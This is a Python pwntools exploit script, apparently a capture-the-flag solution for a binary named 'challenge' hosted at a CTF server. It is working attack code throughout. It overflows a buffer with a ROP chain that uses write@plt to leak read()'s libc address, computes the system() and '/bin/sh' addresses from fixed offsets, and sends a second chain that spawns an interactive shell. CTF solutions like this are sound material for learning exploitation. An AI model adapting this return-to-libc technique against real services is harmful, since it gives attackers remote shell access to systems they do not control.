from pwn import *
from struct import *

def exploit(r):
    ### Leak Address of Read()

    # We are going to use read@plt to grab the base of libc.
    # Setup the registers to call write on the got address of read
    WRITEABLE = 0x0000000000601040 # Writeable Memory Space
    WRITEPLT = binary.symbols["write"]
    READGOT = binary.symbols["got.read"]
    POPRSI = binary.symbols['set_rsi']
    POPRDI = binary.symbols['set_rdi']
    POPRDX = binary.symbols['set_rdx']
    payload = ''
    payload += 'A'*16
    payload += p64(POPRDI) # Set RDI
    payload += p64(0x1)
    payload += p64(POPRSI) # pop rsi
    payload += p64(READGOT)
    payload += p64(POPRDX) # pop rdx
    payload += p64(0x8)
    payload += p64(WRITEPLT)
    payload += p64(binary.symbols['main'])

    # Leak reads address using write@plt
    r.recvuntil(':\n')
    r.send(payload)
    d = r.recv()[-8:]
    read_address = unpack("<Q", d)
    print "read() is at: ", hex(read_address[0])

    # Calculate Libc Base
    read_offset = 0x00000000000f7250
    libc_base = read_address[0] - read_offset
    print "libc_base is at: ", hex(libc_base)

    #Calculate System Address
    system_offset = 0x0000000000045390
    system = libc_base + system_offset
    print "system() is at: ", hex(system)

    binsh = libc_base + libc.search("/bin/sh").next()

    payload2 = ''
    payload2 += 'A'*16
    payload2 += p64(POPRDI)
    payload2 += p64(binsh)
    payload2 += p64(system)
    r.recvuntil(':\n')
    r.send(payload2)
    r.interactive()

if __name__ == '__main__':
    name = './challenge'
    binary = ELF(name)
    libc = ELF('rop2_libc.so')
    #context.log_level = 'DEBUG'

    if len(sys.argv) > 1:
        r = remote('university.opentoallctf.com', '30002')
    else:
        r = process(name)
        pause()

    exploit(r)

